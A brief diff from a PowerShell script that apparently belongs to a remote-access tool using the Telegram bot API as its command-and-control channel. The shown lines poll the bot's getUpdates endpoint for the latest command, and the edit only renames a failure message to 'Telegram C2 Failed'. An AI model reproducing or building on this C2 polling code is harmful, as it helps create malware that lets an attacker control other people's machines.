@@ -565,7 +565,7 @@ try{
     $inMessage=irm -Method Get -Uri ($URL +'/getUpdates') -ErrorAction Stop
     return $inMessage.result[-1]
     }
-Catch{return "TGFail"}
+Catch{return "Telegram C2 Failed"}
 }
 
 #-------------------------------------------- START THE WAIT TO CONNECT LOOP ---------------------------------------------------
